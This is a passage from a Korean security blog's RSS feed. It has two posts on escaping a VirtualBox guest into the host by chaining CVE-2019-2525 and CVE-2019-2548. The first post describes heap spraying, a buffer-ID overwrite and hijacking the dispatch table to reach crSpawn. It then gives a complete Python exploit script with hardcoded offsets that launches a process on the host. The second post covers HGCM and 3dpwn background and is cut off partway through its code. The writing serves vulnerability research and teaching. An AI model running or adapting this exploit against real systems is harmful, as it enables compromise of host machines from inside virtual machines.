CRVBOXSVCBUFFER_t 객체 heap spray</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065488-60fec681-590d-46bf-81e5-c7cd019c0709.png" alt="2"></p><ul><li>crmsg함수 호출, 짝수 bufID의 heap만 free</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065563-1fb476d3-7146-43da-8e08-d5dc73d3a526.png" alt="3"></p><ul><li>crAlloc함수 호출, msg_len = 0x20인 CRMessageReadPixels 할당</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065710-022d03b7-acce-4788-90ba-8dd15874d0ec.png" alt="4"></p><ul><li>Heap Overflow!!</li><li>구체적인 구조체 형태는 아래와 같다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139065764-0bad0be2-cbb6-40a9-b4c9-d61b35cd4f25.png" alt="5"></p><ul><li>heap overflow로 다음 chunk에 있던 CRVBOXSVCBUFFER_t 의 uiId와 uiSize 부분이 overwrite 된다.</li><li>overwrite된 uiID로 해당 공간에 접근할 수 있게된다.</li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="crSpawn-crServerDispatchBoundsInfoCR"><a href="#crSpawn-crServerDispatchBoundsInfoCR" class="headerlink" title="crSpawn, crServerDispatchBoundsInfoCR"></a>crSpawn, crServerDispatchBoundsInfoCR</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">CRpid <span class="title">crSpawn</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *command, <span class="keyword">const</span> <span class="keyword">char</span> *argv[] )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WINDOWS</span></span><br><span class="line"><span class="keyword">char</span> newargv[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">STARTUPINFO si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">void</span>) command;</span><br><span class="line"></span><br><span class="line">ZeroMemory( &amp;si, <span class="keyword">sizeof</span>(si) );</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">ZeroMemory( &amp;pi, <span class="keyword">sizeof</span>(pi) );</span><br><span class="line"></span><br><span class="line">crStrncpy(newargv, argv[<span class="number">0</span>], <span class="number">1000</span> );</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; argv[i]; i++) &#123;</span><br><span class="line">crStrcat(newargv, <span class="string">&quot; &quot;</span>);</span><br><span class="line">crStrcat(newargv, argv[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !CreateProcess(<span class="literal">NULL</span>, newargv, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>, <span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>, &amp;si, &amp;pi) )</span><br><span class="line">&#123;</span><br><span class="line">crWarning(<span class="string">&quot;crSpawn failed, %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pi.hProcess;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* I&#x27;m the child */</span></span><br><span class="line"><span class="keyword">int</span> err = execvp(command, (<span class="keyword">char</span> * <span class="keyword">const</span> *) argv);</span><br><span class="line">crWarning(<span class="string">&quot;crSpawn failed (return code: %d)&quot;</span>, err);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>) pid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crSpawn 함수는 command를 입력받아 execvp를 호출한다.</li><li>crSpawn은 cr_unpackDispatch에 존재하는 함수지만, 직접 호출 할 수 없다.</li><li>crMessage의 opcode가 존재하는 함수에 한해서만 함수 호출을 할 수 있기 때문이다. </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> SERVER_DISPATCH_APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">crServerDispatchBoundsInfoCR</span><span class="params">( <span class="keyword">const</span> CRrecti *bounds, <span class="keyword">const</span> GLbyte *payload, GLint len, GLint num_opcodes )</span></span></span><br></pre></td></tr></table></figure><ul><li>crServerDispatchBoundsInfoCR함수의 인자는 crSpawn와 비슷하다.</li><li>CR_BOUNDSINFOCR_OPCODE는 crServerDispatchBoundsInfoCR 함수를 호출한다.</li></ul><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>CVE-2019-2525로 필요한 메모리 주소 leak</li><li>CRVBOXSVCBUFFER_t 객체 heap spray 후, 짝수 buifID 객체 free</li><li>CVE-2019-2548로 CRMessageReadPixels 객체 할당, heap overflow</li><li>heap overflow를 통한 bufID overwrite</li><li>overwrite된 bufID로 Arbitrary write <ul><li><strong>cr_unpackDispatch에서의 crServerDispatchBoundsInfoCR 함수 주소를 crSpawn으로 overwrite.</strong></li></ul></li><li>CR_BOUNDSINFOCR_OPCODE의 msg를 보내 crSpawn 함수 호출</li><li>VM escape!</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">sys.path.append(<span class="string">&quot;./3dpwn/lib&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> chromium <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_mem</span>(<span class="params">offset</span>):</span></span><br><span class="line">        msg = (</span><br><span class="line">                pack(<span class="string">&quot;&lt;III&quot;</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">                + <span class="string">&#x27;\x00\x00\x00&#x27;</span> + <span class="built_in">chr</span>(CR_EXTEND_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;I&quot;</span>, offset)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;I&quot;</span>, CR_GETATTRIBLOCATION_EXTEND_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x42424242</span>)</span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pixel</span>():</span></span><br><span class="line">        msg = (</span><br><span class="line">                pack(<span class="string">&quot;&lt;III&quot;</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">                + <span class="string">&#x27;\x00\x00\x00&#x27;</span> + <span class="built_in">chr</span>(CR_READPIXELS_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1FFFFFFD</span>, <span class="number">0x00</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;II&quot;</span>, <span class="number">0xdeadbeef</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_crCspawn</span>(<span class="params">addr</span>):</span></span><br><span class="line">        msg = (</span><br><span class="line">                pack(<span class="string">&quot;&lt;III&quot;</span>, CR_MESSAGE_OPCODES,<span class="number">0x41414141</span>,<span class="number">1</span>)</span><br><span class="line">                + <span class="string">&#x27;\x00\x00\x00&#x27;</span> + <span class="built_in">chr</span>(CR_BOUNDSINFOCR_OPCODE)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;IQ&quot;</span>,<span class="number">0</span>,<span class="number">0x636c616378</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;III&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">                + pack(<span class="string">&quot;&lt;Q&quot;</span>,addr)</span><br><span class="line">                )</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">        client = hgcm_connect(<span class="string">&quot;VBoxSharedCrOpenGL&quot;</span>)</span><br><span class="line">        set_version(client)     <span class="comment">#must use</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] CVE-2019-2525/2548 PoC by rvkhun&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] hgcm_connected&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] leak memory&quot;</span>)</span><br><span class="line">        offset = <span class="number">0xfffff618</span></span><br><span class="line">        msg = crmsg(client,leak_mem(offset))</span><br><span class="line"></span><br><span class="line">        crVBoxHGCMAlloc = unpack(<span class="string">&quot;&lt;Q&quot;</span>,msg[<span class="number">8</span>:<span class="number">16</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[*] crVBoxHGCMAlloc : &quot;</span> + <span class="built_in">hex</span>(crVBoxHGCMAlloc))</span><br><span class="line"></span><br><span class="line">        crBoundsinfo = crVBoxHGCMAlloc + <span class="number">0x252a40</span></span><br><span class="line">        crDispatch = crVBoxHGCMAlloc + <span class="number">0x534e50</span></span><br><span class="line">        crSpawn = crVBoxHGCMAlloc - <span class="number">0xc160</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] crBoundsinfo : &quot;</span> + <span class="built_in">hex</span>(crBoundsinfo))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] crDispatch : &quot;</span> + <span class="built_in">hex</span>(crDispatch))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] crSpawn : &quot;</span> + <span class="built_in">hex</span>(crSpawn))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] heap spray&quot;</span>)</span><br><span class="line">        heap_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">                heap = alloc_buf(client,<span class="number">0x20</span>,<span class="string">&quot;H&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">                heap_list.append(heap)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] free heap&quot;</span>)</span><br><span class="line">        heap_list = heap_list[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> heap <span class="keyword">in</span> heap_list[<span class="number">1</span>:<span class="number">5001</span>:<span class="number">2</span>]:</span><br><span class="line">                hgcm_call(client,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,[heap,<span class="string">&quot;A&quot;</span>,<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] make pixel, heap overflow&quot;</span>)</span><br><span class="line">        crmsg(client,make_pixel())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        msg1 = pack(<span class="string">&quot;&lt;IIQ&quot;</span>,<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,crDispatch+<span class="number">0xd8</span>)</span><br><span class="line">        msg2 = pack(<span class="string">&quot;&lt;Q&quot;</span>,crSpawn)</span><br><span class="line">        msg3 = pack(<span class="string">&quot;&lt;IIQ&quot;</span>,<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,crDispatch)</span><br><span class="line">        msg4 = pack(<span class="string">&quot;&lt;Q&quot;</span>,<span class="number">0x636c616378</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[I] overwrite dispatch table&quot;</span>)</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xdeadbeef</span>,<span class="number">0xffffffff</span>,<span class="number">0x90</span>,msg1])</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,<span class="number">0x00</span>,msg2])</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xdeadbeef</span>,<span class="number">0xffffffff</span>,<span class="number">0x90</span>,msg3])</span><br><span class="line">        hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,[<span class="number">0xcafebabe</span>,<span class="number">0xffffffff</span>,<span class="number">0x00</span>,msg4])</span><br><span class="line"></span><br><span class="line">        crmsg(client,call_crCspawn(crDispatch))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li><a href="https://youtu.be/MHI2f1_EjNU">https://youtu.be/MHI2f1_EjNU</a></li></ul><p><img src="https://user-images.githubusercontent.com/49066484/139219869-181eb8c1-d989-47fb-a6b3-c0422106f3f1.png" alt="123"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Virtualization Bug #1 Singi (멘토님 강의자료)</li><li><a href="https://github.com/niklasb/3dpwn">https://github.com/niklasb/3dpwn</a></li><li><a href="https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf">https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf</a></li><li><a href="https://wogh8732.tistory.com/273?category=804777">https://wogh8732.tistory.com/273?category=804777</a></li><li><a href="https://cosyp.tistory.com/247">https://cosyp.tistory.com/247</a></li><li><a href="https://1993-constant.tistory.com/590?category=927096">https://1993-constant.tistory.com/590?category=927096</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VM-Escape/">VM Escape</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VirtualBox/">VirtualBox</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/27/2021-10-28-CVE-2019-2525_2548_2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VM Escape using CVE-2019-2525/2548 (1)</title>
      <link>https://pwnkidhn.github.io/2021/10/25/2021-10-26-CVE-2019-2525_2548_1/</link>
      <guid>https://pwnkidhn.github.io/2021/10/25/2021-10-26-CVE-2019-2525_2548_1/</guid>
      <pubDate>Mon, 25 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;CVE-2019-2525과 CVE-2019-2548을 이용한 VM exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h2&gt;&lt;h3 id=&quot;3D-Acceleration&quot;&gt;&lt;a href=&quot;#3D-Acceleration&quot; class=&quot;headerlink&quot; title=&quot;3D Acceleration&quot;&gt;&lt;/a&gt;3D Acceleration&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;VirtaulBox는 3D Acceleration를 제공한다.&lt;/li&gt;
&lt;li&gt;보통 VM에서 3D기능을 사용하면 속도가 느려지는데&lt;/li&gt;
&lt;li&gt;3D Acceleration는 호스트(실제 컴퓨터의)의  3D 하드웨어를 사용하게 한다. &lt;/li&gt;
&lt;li&gt;(가상머신 -&amp;gt; 실제 하드웨어 접근)</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>CVE-2019-2525과 CVE-2019-2548을 이용한 VM exploit.</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="3D-Acceleration"><a href="#3D-Acceleration" class="headerlink" title="3D Acceleration"></a>3D Acceleration</h3><ul><li>VirtaulBox는 3D Acceleration를 제공한다.</li><li>보통 VM에서 3D기능을 사용하면 속도가 느려지는데</li><li>3D Acceleration는 호스트(실제 컴퓨터의)의  3D 하드웨어를 사용하게 한다. </li><li>(가상머신 -&gt; 실제 하드웨어 접근)<span id="more"></span></li></ul><h3 id="Chromium"><a href="#Chromium" class="headerlink" title="Chromium"></a>Chromium</h3><ul><li>3D Acceleration은 Chromium 라이브러리를 기반으로 만들어졌다.</li><li>Chromium은 OpenGL기반으로 3D Graphic을 ‘remote rendering’ 할 수 있는 라이브러리다.</li><li>Client/Server 구조</li><li>VBox는 Chromium에 새로운 프로토콜을 추가했다.<ul><li>VBoxHGCM</li><li>HGCM : Host/Guest Communication Manager</li></ul></li><li>이 프로토콜을 사용하면, GuestOS에서 실행 중인 Chromium Client가 Host OS 실행 중인 Chromium 서버와 통신이 가능하다.</li><li>Linux에서는 /dev/vboxuser, /dev/vboxguest로 IOCTL 통신하는데,</li><li>이를 쉽게 사용할 수 있도록 구현한 Chromium python library가 존재한다. (<strong>3dpwn</strong>)</li></ul><h3 id="3dpwn-VBoxHGCM-wrapper-library"><a href="#3dpwn-VBoxHGCM-wrapper-library" class="headerlink" title="3dpwn (VBoxHGCM wrapper) library"></a>3dpwn (VBoxHGCM wrapper) library</h3><ul><li>Client의 역할은 connect, disconnect, send chromium message이다.</li><li>CRMessage Structure</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/138862910-0df39bf3-f008-42a0-af48-13230e76832e.png" alt="제목 없음"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    CRMessageHeader      header;</span><br><span class="line">    CRMessageOpcodes     opcodes;</span><br><span class="line">    CRMessageRedirPtr    redirptr;</span><br><span class="line">    CRMessageWriteback   writeback;</span><br><span class="line">    CRMessageReadback    readback;</span><br><span class="line">    CRMessageReadPixels  readPixels;</span><br><span class="line">    CRMessageMulti       multi;</span><br><span class="line">    CRMessageFlowControl flowControl;</span><br><span class="line">    CRMessageNewClient   newclient;</span><br><span class="line">    CRMessageGather      gather;</span><br><span class="line">&#125; CRMessage;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    CRMessageType          type;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>           conn_id;</span><br><span class="line">&#125; CRMessageHeader;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CRMessageOpcodes</span> &#123;</span></span><br><span class="line">    CRMessageHeader        header;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>           numOpcodes;</span><br><span class="line">&#125; CRMessageOpcodes;</span><br></pre></td></tr></table></figure><ul><li>Client가 보내야할 Message의 구조는 위와 같이 Opcode + data의 형태이다.</li></ul><ul><li>통신에 필요한 주요 함수</li><li>hgcm_connect</li><li>hgcm_disconnect </li><li>hgcm_call(conn_id,<strong>function</strong>,params)</li><li><strong>function</strong><ul><li>SHCRGL_GUEST_FN_WRITE_BUFFER</li><li>SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</li></ul></li></ul><ul><li>3dpwn에서는 crmsg함수를 통해 통신한다.</li></ul><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_buf</span>(<span class="params">client, sz, msg=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [<span class="number">0</span>, sz, <span class="number">0</span>, msg])</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crmsg</span>(<span class="params">client, msg, bufsz=<span class="number">0x1000</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Allocate a buffer, write a Chromium message to it, and dispatch it. &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) &lt;= bufsz</span><br><span class="line">    buf = alloc_buf(client, bufsz, msg)</span><br><span class="line">    <span class="comment"># buf,_,_,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0, bufsz, 0, msg])</span></span><br><span class="line">    _, res, _ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf, <span class="string">&quot;A&quot;</span>*bufsz, <span class="number">1337</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><ul><li>crmsg함수는 위에 CRMessage 형태의 msg를 인자로 받으며, alloc_buf를 호출한다.</li><li>alloc_buf에서는 SHCRGL_GUEST_FN_WRITE_BUFFER를 인자로 hgcm_call을 하게 된다.</li><li>이 때, 세번째 인자는 [0,sz,0,msg] 이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SHCRGL_GUEST_FN_WRITE_BUFFER:</span><br><span class="line">&#123;</span><br><span class="line">    Log((<span class="string">&quot;svcCall: SHCRGL_GUEST_FN_WRITE_BUFFER\n&quot;</span>));</span><br><span class="line">    <span class="comment">/* Verify parameter count and types. */</span></span><br><span class="line">    <span class="keyword">if</span> (cParms != SHCRGL_CPARMS_WRITE_BUFFER)</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> (   paParms[<span class="number">0</span>].type != VBOX_HGCM_SVC_PARM_32BIT <span class="comment">/*iBufferID*/</span></span><br><span class="line">        || paParms[<span class="number">1</span>].type != VBOX_HGCM_SVC_PARM_32BIT <span class="comment">/*cbBufferSize*/</span></span><br><span class="line">        || paParms[<span class="number">2</span>].type != VBOX_HGCM_SVC_PARM_32BIT <span class="comment">/*ui32Offset*/</span></span><br><span class="line">        || paParms[<span class="number">3</span>].type != VBOX_HGCM_SVC_PARM_PTR   <span class="comment">/*pBuffer*/</span></span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Fetch parameters. */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> iBuffer      = paParms[<span class="number">0</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbBufferSize = paParms[<span class="number">1</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint32_t</span> ui32Offset   = paParms[<span class="number">2</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint8_t</span> *pBuffer      = (<span class="keyword">uint8_t</span> *)paParms[<span class="number">3</span>].u.pointer.addr;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbBuffer     = paParms[<span class="number">3</span>].u.pointer.size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Execute the function. */</span></span><br><span class="line">        CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);</span><br><span class="line">        <span class="keyword">if</span> (!pSvcBuffer || ((<span class="keyword">uint64_t</span>)ui32Offset+cbBuffer)&gt;cbBufferSize)</span><br><span class="line">        &#123;</span><br><span class="line">            rc = VERR_INVALID_PARAMETER;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        